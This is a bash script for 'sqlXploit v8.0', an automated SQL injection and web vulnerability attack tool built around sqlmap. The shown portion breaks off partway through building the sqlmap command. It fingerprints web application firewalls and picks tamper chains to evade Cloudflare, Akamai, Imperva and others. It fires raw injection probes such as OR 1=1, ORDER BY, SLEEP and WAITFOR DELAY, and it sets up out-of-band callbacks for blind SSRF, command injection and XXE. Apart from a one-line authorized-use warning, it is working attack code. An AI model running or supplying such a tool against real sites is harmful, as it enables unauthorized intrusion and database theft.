#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  sqlXploit v8.0 — SPEED FIRST ARCHITECTURE
#  Target: ~15-25 min for vulnerable, ~35-45 min for clean target
#
#  SPEED OPTIMIZATIONS vs v7.1:
#  ┌─────────────────────────────────────────────────────────────┐
#  │  ① SCAN MODES: Quick(5m) / Smart(20m) / Deep(60m)          │
#  │  ② EARLY EXIT: Stop any module the instant vuln found       │
#  │  ③ PARALLEL: Non-SQLi modules run in background (parallel)  │
#  │  ④ SMART SQLi: Pre-scan tells sqlmap exactly what to test   │
#  │     → skip Boolean if no diff, skip Time if no delay        │
#  │     → pass --param-filter, exact technique, no --forms      │
#  │  ⑤ FAST BASELINE: 2 requests not 5                          │
#  │  ⑥ SINGLE-PASS NON-SQLi: 1 request per param per vuln type  │
#  │     → canary sent once, all patterns checked on same body   │
#  │  ⑦ CONCURRENT HTTP: All non-SQLi probes fire in parallel    │
#  │     → background curl + wait, not sequential sleep loops    │
#  │  ⑧ SMART STOP: each module exits on first confirmed hit     │
#  │  ⑨ INTERACTSH: Single shared OOB URL across all modules     │
#  │     → one poll at the end, not per-module waits             │
#  │  ⑩ INFO DISC: Parallel curl for all 38 paths (background)  │
#  │  ⑪ SQLMAP SPEED: --smart --stop-at-first-match            │
#  │     --no-cast --technique narrowed, --threads=5 when safe   │
#  │  ⑫ TIME-BASED: Only run if Boolean/Error/Union all fail     │
#  │  ⑬ PHASE BUDGET: Hard timeout per phase (configurable)      │
#  │  ⑭ PARAM SMART: Skip static-looking params (id=1 only)     │
#  │     prioritize: id, user, cat, q, search, page, file, name  │
#  └─────────────────────────────────────────────────────────────┘
# ═══════════════════════════════════════════════════════════════════

set -uo pipefail

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'
B='\033[1;34m'; C='\033[1;36m'; M='\033[1;35m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# ─────────────────────────────────────────────
#  LOG FUNCTIONS
# ─────────────────────────────────────────────
LOG_FILE=""
log()        { echo -e "$*"; [[ -n "$LOG_FILE" && -f "$LOG_FILE" ]] && echo -e "$*" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOG_FILE"; }
info()       { log "${B}[*]${NC} $*"; }
ok()         { log "${G}[✓]${NC} $*"; }
warn()       { log "${Y}[!]${NC} $*"; }
err()        { log "${R}[✗]${NC} $*"; }
intel()      { log "${C}[INTEL]${NC} $*"; }
auto()       { log "${M}[AUTO] ${NC} $*"; }
adapt()      { log "${Y}[ADAPT]${NC} $*"; }
hit()        { log "${R}${BOLD}[HIT!]${NC}  $*"; }
step()       { log "${G}[STEP] ${NC} $*"; }
spd()        { log "${M}[SPEED]${NC} $*"; }
sep()        { log "${M} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }
oob()        { log "${R}${BOLD}[OOB!] ${NC} $*"; }
vuln()       { log "${R}${BOLD}[VULN]${NC}  $*"; }
timer()      { log "${Y}[TIME] ${NC} $*"; }
ask()        { local r; read -rp "$(echo -e "${C}$1${NC} ")" r; echo "${r:-}"; }
iask()       { local r; printf "${C}%s${NC}" "$1" >&2; read -r r </dev/tty; echo "${r:-${2:-}}"; }
iask_yn()    { local a; a=$(iask "$1 [y/n] (${2:-y}): " "${2:-y}"); [[ "${a,,}" =~ ^y ]]; }

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
banner() {
  clear
  echo -e "${R}${BOLD}"
  cat << 'BANNER'
  ██████╗  ██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
 ██╔════╝ ██╔═══██╗██║     ██║ ██╔╝██║  ██║██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
 ╚█████╗  ██║   ██║██║     █████╔╝ ███████║██████╔╝██║     ██║   ██║██║   ██║
  ╚═══██╗ ██║▄▄ ██║██║     ██╔═██╗ ██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║
 ██████╔╝ ╚██████╔╝███████╗██║  ██╗██║  ██║██║     ███████╗╚██████╔╝██║   ██║
 ╚═════╝   ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
BANNER
  echo -e "${NC}"
  echo -e "${C}   ⚡ v8.0 — SPEED FIRST | Smart Early-Exit | Parallel Engine ⚡${NC}"
  echo -e "${Y}           Developed by: TehanG07  |  www.cyberi.in${NC}"
  echo -e "${M} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

banner
echo -e "${R}[!] LEGAL:${NC} Authorized testing only. You are fully responsible.\n"

# ─────────────────────────────────────────────
#  DEPENDENCY CHECK
# ─────────────────────────────────────────────
sep
info "Checking dependencies..."
for dep in sqlmap curl python3; do
  command -v "$dep" >/dev/null 2>&1 || {
    warn "Installing $dep..."
    sudo apt-get install -y "$dep" >/dev/null 2>&1 || { err "Cannot install $dep."; exit 1; }
  }
done

OOB_CLIENT=""
if command -v interactsh-client >/dev/null 2>&1; then
  OOB_CLIENT="interactsh-client"; ok "interactsh-client ready"
else
  if command -v go >/dev/null 2>&1; then
    GO111MODULE=on go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest >/dev/null 2>&1 && \
      OOB_CLIENT="$(go env GOPATH)/bin/interactsh-client" && ok "interactsh-client installed"
  fi
  if [[ -z "$OOB_CLIENT" ]]; then
    IURL="https://github.com/projectdiscovery/interactsh/releases/latest/download/interactsh-client_linux_amd64.zip"
    curl -sL "$IURL" -o /tmp/isc.zip 2>/dev/null && unzip -qo /tmp/isc.zip -d /tmp/isc 2>/dev/null && \
      sudo mv /tmp/isc/interactsh-client /usr/local/bin/ 2>/dev/null && \
      OOB_CLIENT="interactsh-client" && ok "interactsh-client installed from binary" || \
      warn "interactsh-client unavailable — OOB uses DNS fallback"
  fi
fi
SQLMAP_VER=$(sqlmap --version 2>/dev/null | grep -oP '\d+\.\d+[\.\d]*' | head -1 || echo "unknown")
ok "sqlmap ${SQLMAP_VER} ready"
sep

# ─────────────────────────────────────────────
#  FILTERS
# ─────────────────────────────────────────────
STATIC_EXCL='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|zip|rar|7z|tar|gz|bz2|br|map)(\?|$)'
AGGR_EXCL='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|zip|rar|7z|tar|gz|bz2|br|map|html?|xml|txt|pdf)(\?|$)'

# ─────────────────────────────────────────────
#  INPUT MODE
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] Input Mode${NC}"
echo -e "  ${G}1${NC}) Single URL"
echo -e "  ${G}2${NC}) URL list file"
echo -e "  ${G}3${NC}) Burp/ZAP request file"
mode=$(ask "Choose [1/2/3]:")
input_url=""; targets_file=""; burp_file=""
case "$mode" in
  1) input_url=$(ask "Target URL (with param e.g. ?id=1):");
     [[ -z "$input_url" ]] && { err "URL required."; exit 1; } ;;
  2) fp=$(ask "URL list file path:"); [[ -f "$fp" ]] || { err "File not found."; exit 1; }
     echo -e "  ${G}1${NC}) Conservative  ${G}2${NC}) Aggressive"
     fm=$(ask "Filter [1/2]:"); tmp="$(mktemp)"
     [[ "$fm" == "2" ]] && grep -Eiv "$AGGR_EXCL"   "$fp" | sed '/^\s*$/d' > "$tmp" \
                        || grep -Eiv "$STATIC_EXCL" "$fp" | sed '/^\s*$/d' > "$tmp"
     [[ -s "$tmp" ]] || { err "No targets after filter."; exit 1; }
     targets_file="$tmp"; ok "$(wc -l < "$tmp") targets queued." ;;
  3) burp_file=$(ask "Burp request file:"); [[ -f "$burp_file" ]] || { err "File not found."; exit 1; }
     ok "Request file loaded." ;;
  *) err "Invalid."; exit 1 ;;
esac

# ─────────────────────────────────────────────
#  ① SCAN MODE — the core speed control
# ─────────────────────────────────────────────
sep
echo -e "${BOLD}[2] Scan Mode${NC} ${DIM}— controls how deep each module goes${NC}"
echo ""
echo -e "  ${G}1${NC}) ${BOLD}QUICK${NC}   ${DIM}~5-15 min${NC}  — Error/Union only, level 1, no time-based"
echo -e "           ${DIM}Best for: CTF, known-vuln targets, fast triage${NC}"
echo ""
echo -e "  ${G}2${NC}) ${BOLD}SMART${NC}   ${DIM}~20-35 min${NC} — Auto-detects technique, skips dead ends"
echo -e "           ${DIM}Best for: most real targets, bug bounty${NC}"
echo ""
echo -e "  ${G}3${NC}) ${BOLD}DEEP${NC}    ${DIM}~60-90 min${NC} — All techniques, max level/risk, full non-SQLi"
echo -e "           ${DIM}Best for: pen test, thorough audit${NC}"
echo ""
SCAN_MODE=$(ask "Choose [1/2/3] (default: 2):" ); SCAN_MODE=${SCAN_MODE:-2}

case "$SCAN_MODE" in
  1) MODE_NAME="QUICK";  SQLMAP_LEVEL=1; SQLMAP_RISK=1; SQLMAP_THREADS=5
     SQLMAP_TECHNIQUE="EU";   TIME_SEC=7;  PHASE_BUDGET=300
     DO_TIME_BASED=false; DO_OOB=false; DO_SECOND_ORDER=false
     NON_SQLI_PARALLEL=true;  INFO_DISC_PARALLEL=true
     SQLI_TIMEOUT=240; NONSQLI_TIMEOUT=60 ;;
  2) MODE_NAME="SMART";  SQLMAP_LEVEL=2; SQLMAP_RISK=1; SQLMAP_THREADS=3
     SQLMAP_TECHNIQUE="AUTO"; TIME_SEC=8;  PHASE_BUDGET=600
     DO_TIME_BASED=true;  DO_OOB=true;  DO_SECOND_ORDER=false
     NON_SQLI_PARALLEL=true;  INFO_DISC_PARALLEL=true
     SQLI_TIMEOUT=480; NONSQLI_TIMEOUT=120 ;;
  3) MODE_NAME="DEEP";   SQLMAP_LEVEL=3; SQLMAP_RISK=2; SQLMAP_THREADS=3
     SQLMAP_TECHNIQUE="AUTO"; TIME_SEC=10; PHASE_BUDGET=1800
     DO_TIME_BASED=true;  DO_OOB=true;  DO_SECOND_ORDER=true
     NON_SQLI_PARALLEL=false; INFO_DISC_PARALLEL=true
     SQLI_TIMEOUT=1200; NONSQLI_TIMEOUT=300 ;;
  *) SCAN_MODE=2; MODE_NAME="SMART"; SQLMAP_LEVEL=2; SQLMAP_RISK=1; SQLMAP_THREADS=3
     SQLMAP_TECHNIQUE="AUTO"; TIME_SEC=8;  PHASE_BUDGET=600
     DO_TIME_BASED=true;  DO_OOB=true;  DO_SECOND_ORDER=false
     NON_SQLI_PARALLEL=true; INFO_DISC_PARALLEL=true
     SQLI_TIMEOUT=480; NONSQLI_TIMEOUT=120 ;;
esac
ok "Scan mode: ${MODE_NAME} | threads:${SQLMAP_THREADS} | budget:${PHASE_BUDGET}s/phase"

# ─────────────────────────────────────────────
#  SESSION / AUTH
# ─────────────────────────────────────────────
sep
echo -e "${BOLD}[3] Session / Auth${NC} ${DIM}(Enter to skip each)${NC}"
CK_VAL=""; HD_VAL=""; PX_VAL=""; COOKIE_OPT=""; HEADER_OPT=""; PROXY_OPT=""
CK_VAL=$(ask "Cookie:");  [[ -n "$CK_VAL" ]] && COOKIE_OPT="--cookie=${CK_VAL}"
HD_VAL=$(ask "Custom header (e.g. Authorization: Bearer xyz):"); [[ -n "$HD_VAL" ]] && HEADER_OPT="--headers=${HD_VAL}"
PX_VAL=$(ask "Proxy (e.g. http://127.0.0.1:8080):"); [[ -n "$PX_VAL" ]] && PROXY_OPT="--proxy=${PX_VAL}"

# ─────────────────────────────────────────────
#  OOB/OAST SETUP
# ─────────────────────────────────────────────
sep
echo -e "${BOLD}[4] OOB/OAST${NC} ${DIM}(needed for blind SQLi, SSRF, CMDi, XXE)${NC}"
echo -e "  ${G}1${NC}) Public oast.pro (auto)  ${G}2${NC}) Self-hosted server  ${G}3${NC}) Skip"
oob_choice=$(ask "Choose [1/2/3]:")
OOB_DOMAIN=""; OOB_TOKEN=""; USE_OOB=false; OOB_SESSION_FILE=""
OOB_PAYLOAD_URL=""; OOB_PAYLOAD_ID=""
# Shared OOB URL used by ALL modules (one poll at end, not per-module)
SHARED_OOB_URL=""; SHARED_OOB_ID=""
OOB_FIRED_LABELS=()   # tracks what labels fired payloads to shared OOB

case "$oob_choice" in
  1) USE_OOB=true; OOB_DOMAIN="oast.pro"
     OOB_SESSION_FILE="$(mktemp /tmp/oob.XXXXXX)"; ok "OOB: oast.pro" ;;
  2) OOB_DOMAIN=$(ask "Interactsh server domain:"); OOB_TOKEN=$(ask "Token (Enter=skip):")
     USE_OOB=true; OOB_SESSION_FILE="$(mktemp /tmp/oob.XXXXXX)"; ok "OOB: ${OOB_DOMAIN}" ;;
  *) warn "OOB disabled" ;;
esac

# ─────────────────────────────────────────────
#  NON-SQLi MODULE SELECTION
# ─────────────────────────────────────────────
sep
echo -e "${BOLD}[5] Non-SQLi Modules${NC}"
echo -e "  ${G}9${NC}) ALL  ${G}0${NC}) SKIP  ${G}1${NC}) SSRF  ${G}2${NC}) SSTI  ${G}3${NC}) XSS  ${G}4${NC}) LFI  ${G}5${NC}) CMDi  ${G}6${NC}) XXE  ${G}7${NC}) Redirect  ${G}8${NC}) InfoDisc"
NONSQLI_CHOICE=$(ask "Choose [0-9 or comma e.g. 1,3,8]:")
SCAN_SSRF=false; SCAN_SSTI=false; SCAN_XSS=false; SCAN_LFI=false
SCAN_CMDI=false; SCAN_XXE=false;  SCAN_REDIR=false; SCAN_INFO=false
if echo "$NONSQLI_CHOICE" | grep -q "9"; then
  SCAN_SSRF=true; SCAN_SSTI=true; SCAN_XSS=true; SCAN_LFI=true
  SCAN_CMDI=true; SCAN_XXE=true;  SCAN_REDIR=true; SCAN_INFO=true
elif ! echo "$NONSQLI_CHOICE" | grep -q "0"; then
  echo "$NONSQLI_CHOICE" | grep -q "1" && SCAN_SSRF=true
  echo "$NONSQLI_CHOICE" | grep -q "2" && SCAN_SSTI=true
  echo "$NONSQLI_CHOICE" | grep -q "3" && SCAN_XSS=true
  echo "$NONSQLI_CHOICE" | grep -q "4" && SCAN_LFI=true
  echo "$NONSQLI_CHOICE" | grep -q "5" && SCAN_CMDI=true
  echo "$NONSQLI_CHOICE" | grep -q "6" && SCAN_XXE=true
  echo "$NONSQLI_CHOICE" | grep -q "7" && SCAN_REDIR=true
  echo "$NONSQLI_CHOICE" | grep -q "8" && SCAN_INFO=true
fi

# ─────────────────────────────────────────────
#  OUTPUT DIR
# ─────────────────────────────────────────────
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_DIR="sqlxploit_${TIMESTAMP}"
mkdir -p "$LOG_DIR"
LOG_FILE="${LOG_DIR}/full_log.txt"
HITS_FILE="${LOG_DIR}/confirmed.txt"
INTEL_FILE="${LOG_DIR}/intel.txt"
BLOCK_LOG="${LOG_DIR}/blocks.txt"
DUMP_DIR="${LOG_DIR}/dumps"
OOB_DIR="${LOG_DIR}/oob"
VULN_DIR="${LOG_DIR}/vulns"
mkdir -p "$DUMP_DIR" "$OOB_DIR" "$VULN_DIR"
: > "$LOG_FILE"; : > "$HITS_FILE"; : > "$INTEL_FILE"; : > "$BLOCK_LOG"

# ─────────────────────────────────────────────
#  SCAN START TIME (for global budget tracking)
# ─────────────────────────────────────────────
SCAN_START=$(date +%s)
SQLI_FOUND=false         # Global flag: if SQLi found, skip remaining phases
TARGET_VULN_COUNT=0      # Running count of confirmed vulns

elapsed_since_start() { echo $(( $(date +%s) - SCAN_START )); }

# ─────────────────────────────────────────────
#  SANITIZER
# ─────────────────────────────────────────────
sanitize_output() {
  sed -e 's/sqlmap/sqlXploit/Ig' \
      -e '/^        ___/d' -e '/^       __H__/d' -e '/^ ___ ___/d' \
      -e '/^|___|/d' -e '/^|_ -|/d' -e '/^      |_|/d' -e '/sqlmap\.org/d'
}

# ─────────────────────────────────────────────
#  GLOBAL STATE
# ─────────────────────────────────────────────
BLOCK_COUNT=0; CURRENT_DELAY=0; CURRENT_THREADS=$SQLMAP_THREADS
MAX_BLOCK_RETRIES=3; BASELINE_TIME=0; BASELINE_SIZE=0
BASELINE_BODY=""; BASELINE_TITLE=""; WAF_NAME=""
DBMS_HINT=""; TECH_STACK=""; IS_UNSTABLE=false
HTTP2_SUPPORTED=false; TAMPER_INDEX=0; CURRENT_TAMPER=""
COLUMN_COUNT=0; DETECTED_TECHNIQUE=""  # fastest confirmed technique
INJECTABLE_PARAM=""                    # confirmed param → skip others

TAMPER_POOL=(
  "space2comment,between,randomcase"
  "space2comment,randomcase,charencode"
  "space2comment,charunicodeencode,between"
  "space2plus,randomcase,between,charencode"
  "space2comment,randomcase,equaltolike,between"
  "versionedkeywords,space2comment,randomcase"
  "modsecurityversioned,space2comment,randomcase"
  "space2comment,randomcase,charunicodeencode,versionedkeywords"
)

# ─────────────────────────────────────────────
#  CURL HELPERS — tight timeouts
# ─────────────────────────────────────────────
do_curl() {
  local url="$1"; shift
  curl -s --max-time 12 -L \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122 Safari/537.36" \
    ${CK_VAL:+--cookie "${CK_VAL}"} \
    "$@" "$url" 2>/dev/null || echo ""
}

# Fast HEAD check
do_head() { curl -sI --max-time 8 -L -A "Mozilla/5.0" "$1" 2>/dev/null | tr '[:upper:]' '[:lower:]' || echo ""; }

# Check HTTP status code only
http_code() { curl -o /dev/null -s -w "%{http_code}" --max-time 6 "$1" 2>/dev/null || echo "000"; }

# Parallel curl — fires requests in background, writes to tmp files
# Usage: pcurl_start <label> <url> [curl_args...]
# Then call: pcurl_wait <label> → returns body
declare -A PCURL_PIDS
declare -A PCURL_FILES
pcurl_start() {
  local label="$1" url="$2"; shift 2
  local tmpf; tmpf=$(mktemp /tmp/pcurl.XXXXXX)
  PCURL_FILES["$label"]="$tmpf"
  ( do_curl "$url" "$@" > "$tmpf" 2>/dev/null ) &
  PCURL_PIDS["$label"]=$!
}
pcurl_wait() {
  local label="$1"
  local pid="${PCURL_PIDS[$label]:-}"
  [[ -n "$pid" ]] && wait "$pid" 2>/dev/null || true
  local f="${PCURL_FILES[$label]:-}"
  [[ -f "$f" ]] && cat "$f" && rm -f "$f" || echo ""
  unset "PCURL_PIDS[$label]" "PCURL_FILES[$label]"
}
pcurl_waitall() {
  for label in "${!PCURL_PIDS[@]}"; do
    local pid="${PCURL_PIDS[$label]}"; wait "$pid" 2>/dev/null || true
    unset "PCURL_PIDS[$label]"
  done
}

# ═══════════════════════════════════════════════════════════════
#  ② FAST BASELINE — 2 requests, not 5
# ═══════════════════════════════════════════════════════════════
capture_baseline() {
  local url="$1"
  info "Fast baseline (2 requests)..."
  local times=() sizes=()
  local i t_s t_e body el
  for i in 1 2; do
    t_s=$(date +%s%N)
    body=$(do_curl "$url")
    t_e=$(date +%s%N)
    el=$(( (t_e - t_s) / 1000000 ))
    times+=("$el"); sizes+=(${#body})
    [[ $i -eq 1 ]] && BASELINE_BODY="$body" && \
      BASELINE_TITLE=$(echo "$body" | grep -oiP '(?<=<title>)[^<]+' | head -1 | tr -d '\n\r' || echo "")
    sleep 0.2
  done
  BASELINE_TIME=$(( (times[0] + times[1]) / 2 ))
  BASELINE_SIZE=$(( (sizes[0] + sizes[1]) / 2 ))
  local var=$(( times[0] > times[1] ? times[0] - times[1] : times[1] - times[0] ))
  (( var > 3000 )) && IS_UNSTABLE=true || IS_UNSTABLE=false
  intel "Baseline time:${BASELINE_TIME}ms size:${BASELINE_SIZE}B unstable:${IS_UNSTABLE}"
  echo "BASELINE: ${BASELINE_TIME}ms ${BASELINE_SIZE}B" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  FINGERPRINT — unchanged but faster (parallel header+error check)
# ═══════════════════════════════════════════════════════════════
fingerprint_target() {
  local url="$1"
  sep; info "Fingerprinting target..."
  local headers; headers=$(do_head "$url")
  WAF_NAME=""
  if   echo "$headers" | grep -q "cf-ray\|cloudflare";              then WAF_NAME="cloudflare"
  elif echo "$headers" | grep -q "x-akamai\|akamaighost";           then WAF_NAME="akamai"
  elif echo "$headers" | grep -q "x-amzn-requestid\|awselb";        then WAF_NAME="aws"
  elif echo "$headers" | grep -q "x-iinfo\|incap_ses\|visid_incap"; then WAF_NAME="imperva"
  elif echo "$headers" | grep -q "x-sucuri-id";                     then WAF_NAME="sucuri"
  elif echo "$headers" | grep -q "bigipserver\|f5-";                then WAF_NAME="f5"
  elif echo "$headers" | grep -q "barracuda";                       then WAF_NAME="barracuda"
  fi
  if [[ -z "$WAF_NAME" ]]; then
    local wsc; wsc=$(http_code "${url}%27%20OR%201%3D1--%20-")
    [[ "$wsc" =~ ^(403|406|418|501|999)$ ]] && WAF_NAME="generic"
  fi
  TECH_STACK=""; DBMS_HINT=""
  if   echo "$headers" | grep -q "phpsessid\|x-powered-by: php";   then TECH_STACK="php";    DBMS_HINT="--dbms=MySQL"
  elif echo "$headers" | grep -q "asp.net_sessionid\|x-aspnet";    then TECH_STACK="aspnet"; DBMS_HINT="--dbms=MSSQL"
  elif echo "$headers" | grep -q "jsessionid";                      then TECH_STACK="java"
  elif echo "$headers" | grep -q "x-runtime\|x-powered-by.*ruby";  then TECH_STACK="ruby";   DBMS_HINT="--dbms=PostgreSQL"
  elif echo "$headers" | grep -q "csrftoken\|django";               then TECH_STACK="django"; DBMS_HINT="--dbms=PostgreSQL"
  fi
  if [[ -z "$DBMS_HINT" ]]; then
    local eb; eb=$(do_curl "${url}'" | head -c 2000)
    if   echo "$eb" | grep -qiE "mysql_fetch|sql syntax.*mysql";    then DBMS_HINT="--dbms=MySQL"
    elif echo "$eb" | grep -qiE "pg_query|postgresql";              then DBMS_HINT="--dbms=PostgreSQL"
    elif echo "$eb" | grep -qiE "ora-[0-9]{4}";                     then DBMS_HINT="--dbms=Oracle"
    elif echo "$eb" | grep -qiE "unclosed quotation|mssql";         then DBMS_HINT="--dbms=MSSQL"
    elif echo "$eb" | grep -qiE "sqlite3|sqlite_master";            then DBMS_HINT="--dbms=SQLite"
    fi
  fi
  local h2; h2=$(curl -sI --http2 --max-time 5 "$url" 2>&1 | grep -i "HTTP/2" || true)
  [[ -n "$h2" ]] && HTTP2_SUPPORTED=true || HTTP2_SUPPORTED=false
  # WAF-based tamper/delay config
  case "$WAF_NAME" in
    cloudflare) CURRENT_TAMPER="space2comment,between,randomcase,charencode"; CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    akamai)     CURRENT_TAMPER="space2comment,randomcase,between,charunicodeencode"; CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    aws)        CURRENT_TAMPER="space2comment,randomcase,charunicodeencode,between"; CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    imperva)    CURRENT_TAMPER="space2comment,randomcase,charunicodeencode,multiplespaces"; CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    sucuri)     CURRENT_TAMPER="space2comment,randomcase,between,charencode"; CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    f5|barracuda) CURRENT_TAMPER="space2comment,between,randomcase,charencode"; CURRENT_DELAY=1; CURRENT_THREADS=2 ;;
    generic)    CURRENT_TAMPER="space2comment,between,randomcase"; CURRENT_DELAY=1; CURRENT_THREADS=2 ;;
    "")         CURRENT_TAMPER=""; CURRENT_DELAY=0; CURRENT_THREADS=$SQLMAP_THREADS ;;
  esac
  sep
  log "${C}${BOLD}📊 FINGERPRINT${NC}"
  log "  ${B}WAF     :${NC} ${WAF_NAME:-None}  ${B}Stack:${NC} ${TECH_STACK:-Unknown}  ${B}DBMS:${NC} ${DBMS_HINT:-(auto)}"
  log "  ${B}HTTP/2  :${NC} ${HTTP2_SUPPORTED}  ${B}Unstable:${NC} ${IS_UNSTABLE}"
  log "  ${G}→ delay :${NC} ${CURRENT_DELAY}s | ${G}threads:${NC} ${CURRENT_THREADS} | ${G}tamper:${NC} ${CURRENT_TAMPER:-(none)}"
  sep
  echo "WAF=${WAF_NAME} Stack=${TECH_STACK} DBMS=${DBMS_HINT}" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  ③ SMART PRE-SCAN — tells sqlmap exactly what technique to use
#  Returns: TECHNIQUE string e.g. "E", "B", "U", "T", "BE", "EU"
#  STOPS testing as soon as one technique signal is confirmed
#  Total time: ~3-6 seconds
# ═══════════════════════════════════════════════════════════════
prescan_technique() {
  local url="$1"
  info "Pre-scan: detecting injectable technique..."
  DETECTED_TECHNIQUE=""
  local signals=()

  # ── Signal 1: Error-based (fastest, 1 request) ──
  local err_body; err_body=$(do_curl "${url}'" | head -c 3000)
  if echo "$err_body" | grep -qiE "you have an error in your sql|warning.*mysql|pg_query|ora-[0-9]{4}|sqlite3|mssql|syntax error.*sql|unclosed quotation|mysql_fetch|ORA-"; then
    signals+=("E"); intel "Signal: SQL ERROR leaked → technique E"
  fi

  # ── Signal 2: Boolean diff (2 requests, ~0.5s) ──
  pcurl_start "bool_true"  "${url}%20AND%201%3D1--%20-"
  pcurl_start "bool_false" "${url}%20AND%201%3D2--%20-"
  local bt bf; bt=$(pcurl_wait "bool_true"); bf=$(pcurl_wait "bool_false")
  local st=${#bt} sf=${#bf}
  local bool_diff=$(( st > sf ? st - sf : sf - st ))
  if (( bool_diff > 80 )); then
    signals+=("B"); intel "Signal: Boolean diff ${bool_diff}B → technique B"
  fi

  # ── Signal 3: UNION test (1 request via ORDER BY) ──
  # Test ORDER BY 1 and ORDER BY 9999 — if different response = injectable
  pcurl_start "ob1"    "${url}%20ORDER%20BY%201--%20-"
  pcurl_start "ob9999" "${url}%20ORDER%20BY%209999--%20-"
  local ob1 ob9; ob1=$(pcurl_wait "ob1"); ob9=$(pcurl_wait "ob9999")
  local ob_diff=$(( ${#ob1} > ${#ob9} ? ${#ob1} - ${#ob9} : ${#ob9} - ${#ob1} ))
  if (( ob_diff > 50 )) || echo "$ob9" | grep -qiE "unknown column|ORDER BY position|1054|ORA-01785"; then
    signals+=("U"); intel "Signal: ORDER BY diff ${ob_diff}B → technique U candidate"
  fi

  # ── Signal 4: Stacked / Error again via different payload ──
  local stack_body; stack_body=$(do_curl "${url}%3B%20SELECT%201--%20-" | head -c 1000)
  if ! echo "$stack_body" | grep -qiE "404|not found|error" && [[ ${#stack_body} -gt 100 ]]; then
    signals+=("S"); intel "Signal: Stacked queries possible → technique S candidate"
  fi

  # ── Signal 5: Time-based — ONLY if mode allows AND no other signals ──
  if $DO_TIME_BASED && (( ${#signals[@]} == 0 )); then
    intel "No fast signals — checking time-based..."
    local t_threshold=$(( BASELINE_TIME + 4500 ))
    local ts te el
    ts=$(date +%s%N)
    do_curl "${url}%27%20AND%20SLEEP(5)--%20-" > /dev/null
    te=$(date +%s%N); el=$(( (te - ts) / 1000000 ))
    if (( el > t_threshold )); then
      signals+=("T"); intel "Signal: Time delay ${el}ms → technique T"
    fi
    # MSSQL WAITFOR
    if (( ${#signals[@]} == 0 )); then
      ts=$(date +%s%N)
      do_curl "${url}%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--%20-" > /dev/null
      te=$(date +%s%N); el=$(( (te - ts) / 1000000 ))
      (( el > t_threshold )) && signals+=("T") && intel "MSSQL time delay confirmed"
    fi
  fi

  # ── Build technique string from signals ──
  if (( ${#signals[@]} == 0 )); then
    DETECTED_TECHNIQUE="BE"   # fallback: boolean + error
    warn "No strong signals — using fallback technique BE"
  else
    DETECTED_TECHNIQUE=$(printf '%s' "${signals[@]}" | tr -d ' ' | sed 's/./&/g' | sort -u | tr -d '\n')
    # Always include B and E for reliability even if not directly signaled
    [[ "$DETECTED_TECHNIQUE" != *B* ]] && [[ "$DETECTED_TECHNIQUE" != *E* ]] && DETECTED_TECHNIQUE="BE${DETECTED_TECHNIQUE}"
    auto "Detected techniques: ${DETECTED_TECHNIQUE}"
  fi

  echo "TECHNIQUE=${DETECTED_TECHNIQUE} signals=${signals[*]:-none}" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  ④ SMART PARAM PRIORITIZATION
#  Sort params by exploitability likelihood
#  High priority: id, uid, user, cat, page, file, name, key, search, q
#  Low priority:  lang, country, format, currency, theme, style
# ═══════════════════════════════════════════════════════════════
prioritize_params() {
  local url="$1"
  local all_params; all_params=$(echo "$url" | grep -oP '[?&]\K\w+(?==)')
  local high=() low=()
  local HP="^(id|uid|user|userid|user_id|cat|category|page|file|name|search|q|query|key|item|product|order|pid|tid|nid|post|article|news|entry|record|row|ref|type|action|cmd|exec|run)$"
  for p in $all_params; do
    echo "$p" | grep -qiP "$HP" && high+=("$p") || low+=("$p")
  done
  printf '%s\n' "${high[@]}" "${low[@]}"
}

# ═══════════════════════════════════════════════════════════════
#  ⑤ BUILD SQLMAP COMMAND — speed-optimized flags
# ═══════════════════════════════════════════════════════════════
build_sqlmap_cmd() {
  local -n _arr="$1"
  local url_arg="$2" technique="$3" level="${4:-$SQLMAP_LEVEL}" risk="${5:-$SQLMAP_RISK}" ts="${6:-$TIME_SEC}"

  _arr=(
    sqlmap
    "--technique=${technique}"
    "--level=${level}"
    "--risk=${risk}"
    "--threads=${CURRENT_THREADS}"
    "--timeout=15"
    "--retries=2"
    "--time-sec=${ts}"
    --batch
    --random-agent
    --smart                   # skip params that don't look injectable
    --text-only
    --titles
    --disable-coloring
    --no-cast
    --banner
    "--output-dir=${DUMP_DIR}"
  )
  # Remove --forms in quick mode (huge time saver)
  [[ "$SCAN_MODE" == "3" ]] && _arr+=( --forms )
  [[ "$url_arg" == -r* ]] && _arr+=( $url_arg ) || _arr+=( -u "$url_arg" )

  # Pass param filter if we know which param is injectable
